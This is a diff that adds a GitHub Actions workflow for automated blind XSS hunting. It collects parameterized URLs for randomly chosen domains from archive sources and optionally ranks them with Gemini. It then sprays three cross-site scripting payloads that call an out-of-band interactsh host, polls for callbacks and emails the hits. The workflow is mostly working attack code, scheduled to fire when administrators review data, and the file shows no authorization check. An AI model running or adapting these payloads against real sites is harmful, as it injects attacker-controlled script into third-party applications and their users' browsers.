@@ -1,0 +1,236 @@
+name: "Blind XSS Hunter with AI Triage"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_count:
+        description: 'Number of targets to scan'
+        required: false
+        default: '3'
+      use_ai_triage:
+        description: 'Use AI to prioritize URLs'
+        required: false
+        default: 'true'
+        type: boolean
+  schedule:
+    # Tuesday morning (after Monday admin reviews)
+    - cron: '0 6 * * 2'
+    
+    # Thursday morning (mid-week activity)
+    - cron: '0 6 * * 4'
+    
+    # Saturday morning (weekend monitoring jobs)
+    - cron: '0 6 * * 6'
+
+jobs:
+  bxss-scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        
+      - name: Setup Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.21'
+          cache: true
+          
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+          
+      - name: Cache Tools
+        id: cache-tools
+        uses: actions/cache@v4
+        with:
+          path: ~/go/bin
+          key: ${{ runner.os }}-bxss-tools-v3
+          
+      - name: Install Tools
+        if: steps.cache-tools.outputs.cache-hit != 'true'
+        run: |
+          go install github.com/tomnomnom/waybackurls@latest
+          go install github.com/tomnomnom/qsreplace@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+          pip install uro google-generativeai
+          
+      - name: Add to PATH
+        run: echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+        
+      - name: Setup OAST Session
+        shell: bash
+        run: |
+          mkdir -p tmp results reports
+          
+          if [[ -n "${{ secrets.OAST_SESSION_FILE }}" ]]; then
+            echo "${{ secrets.OAST_SESSION_FILE }}" | base64 -d > tmp/sessions.yml 2>/dev/null || true
+          fi
+          
+          if [[ ! -f tmp/sessions.yml ]]; then
+            timeout 30s interactsh-client -sf tmp/sessions.yml -n 1 -persist 2>&1 | tee tmp/session_gen.log || true
+          fi
+          
+          OAST_URL=$(grep -oP "[a-z0-9]{20,}\.(oast\.[a-z]+|interact\.sh)" tmp/sessions.yml | head -1)
+          echo "OAST_URL=$OAST_URL" >> $GITHUB_ENV
+          echo "🌐 OAST endpoint: $OAST_URL"
+          
+      - name: Collect URLs
+        shell: bash
+        env:
+          TARGET_COUNT: ${{ github.event.inputs.target_count || '3' }}
+        run: |
+          shuf -n "$TARGET_COUNT" targets.txt > tmp/active_targets.txt
+          
+          echo "🔍 Collecting URLs from $TARGET_COUNT targets..."
+          
+          while IFS= read -r domain; do
+            [[ -z "$domain" ]] && continue
+            echo "📡 Scanning: $domain"
+            
+            (
+              timeout 4m waybackurls "$domain" 2>/dev/null || true
+              timeout 4m gau "$domain" --threads 5 --blacklist jpg,jpeg,png,gif,css,js,woff,woff2 2>/dev/null || true
+            ) >> tmp/all_urls.txt
+            
+          done < tmp/active_targets.txt
+          
+          # Deduplicate and filter
+          cat tmp/all_urls.txt | grep "=" | uro --filters hasparams > tmp/filtered.txt || true
+          
+          url_count=$(wc -l < tmp/filtered.txt 2>/dev/null || echo 0)
+          echo "📦 Collected $url_count unique parameterized URLs"
+          
+      - name: AI Triage (Optional)
+        if: github.event.inputs.use_ai_triage != 'false'
+        shell: bash
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+        run: |
+          if [[ -z "$GEMINI_API_KEY" ]]; then
+            echo "⚠️  GEMINI_API_KEY not set, skipping AI triage"
+            cp tmp/filtered.txt tmp/final_targets.txt
+            exit 0
+          fi
+          
+          if [[ ! -s tmp/filtered.txt ]]; then
+            echo "⚠️  No URLs to triage"
+            touch tmp/final_targets.txt
+            exit 0
+          fi
+          
+          echo "🤖 Running AI-powered URL triage..."
+          
+          # Copy AI triage script (assumes it's in repo as ai_triage.py)
+          python3 ai_triage.py tmp/filtered.txt tmp/
+          
+          # Use high priority URLs first, fallback to medium if none
+          if [[ -s tmp/high_priority.txt ]]; then
+            echo "🔥 Using high-priority URLs from AI triage"
+            cp tmp/high_priority.txt tmp/final_targets.txt
+            
+            # Add some medium priority if we have capacity
+            if [[ -s tmp/medium_priority.txt ]]; then
+              head -50 tmp/medium_priority.txt >> tmp/final_targets.txt
+            fi
+          else
+            echo "⚡ No high-priority URLs, using medium priority"
+            cp tmp/medium_priority.txt tmp/final_targets.txt 2>/dev/null || cp tmp/filtered.txt tmp/final_targets.txt
+          fi
+          
+          final_count=$(wc -l < tmp/final_targets.txt)
+          echo "✅ AI selected $final_count URLs for testing"
+          
+      - name: Manual Triage (Fallback)
+        if: github.event.inputs.use_ai_triage == 'false'
+        shell: bash
+        run: |
+          echo "🎯 Using pattern-based filtering..."
+          
+          grep -Ei "id=|query=|search=|q=|msg=|message=|name=|email=|url=|redirect=|callback=|ref=|path=|debug=|view=|page=|template=|comment=|feedback=|log=" \
+            tmp/filtered.txt > tmp/final_targets.txt || cp tmp/filtered.txt tmp/final_targets.txt
+          
+          final_count=$(wc -l < tmp/final_targets.txt)
+          echo "✅ Pattern matching selected $final_count URLs"
+          
+      - name: Inject Payloads
+        shell: bash
+        run: |
+          if [[ ! -s tmp/final_targets.txt ]]; then
+            echo "⚠️  No targets to test"
+            exit 0
+          fi
+          
+          declare -a PAYLOADS=(
+            "\"><script src=\"https://$OAST_URL/1\"></script>"
+            "'><img src=x onerror=\"fetch('https://$OAST_URL/2')\">"
+            "\';fetch('https://$OAST_URL/3');//"
+          )
+          
+          target_count=$(wc -l < tmp/final_targets.txt)
+          echo "🚀 Injecting into $target_count URLs..."
+          
+          for i in "${!PAYLOADS[@]}"; do
+            payload="${PAYLOADS[$i]}"
+            echo "💉 Payload variant $((i+1))/${#PAYLOADS[@]}..."
+            
+            cat tmp/final_targets.txt | \
+              qsreplace "$payload" | \
+              xargs -I {} -P 15 bash -c 'curl -sk -L -m 8 -A "Mozilla/5.0" --max-redirs 3 "{}" -o /dev/null' 2>/dev/null
+          done
+          
+          echo "✅ Injection complete"
+          
+      - name: Poll OAST
+        shell: bash
+        run: |
+          echo "📡 Polling OAST for 2 minutes..."
+          interactsh-client -sf tmp/sessions.yml -poll-interval 5 -duration 2 -v 2>&1 | tee tmp/oast_raw.log || true
+          
+          if grep -qiE "http|dns" tmp/oast_raw.log; then
+            echo "🔥 BLIND XSS HIT DETECTED!"
+            echo "HAS_HITS=true" >> $GITHUB_ENV
+            
+            cat > reports/hits_summary.txt <<EOF
+          🚨 BLIND XSS HIT DETECTED
+          Run: #${{ github.run_number }}
+          Time: $(date -u)
+          OAST: $OAST_URL
+          
+          $(cat tmp/oast_raw.log)
+          EOF
+          else
+            echo "HAS_HITS=false" >> $GITHUB_ENV
+          fi
+          
+      - name: Upload Results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bxss-results-${{ github.run_number }}
+          path: |
+            tmp/*.txt
+            tmp/*.json
+            tmp/*.md
+            reports/
+          retention-days: 30
+          
+      - name: Send Alert
+        if: env.HAS_HITS == 'true' && secrets.EMAIL_USERNAME != ''
+        uses: dawidd6/action-send-mail@v3
+        with:
+          server_address: smtp.gmail.com
+          server_port: 465
+          secure: true
+          username: ${{ secrets.EMAIL_USERNAME }}
+          password: ${{ secrets.EMAIL_PASSWORD }}
+          subject: "🚨 BLIND XSS HIT - Run #${{ github.run_number }}"
+          to: ${{ secrets.EMAIL_USERNAME }}
+          from: "BXSS Hunter <${{ secrets.EMAIL_USERNAME }}>"
+          body: file://reports/hits_summary.txt
+          attachments: |
+            reports/hits_summary.txt
+            tmp/triage_report.md
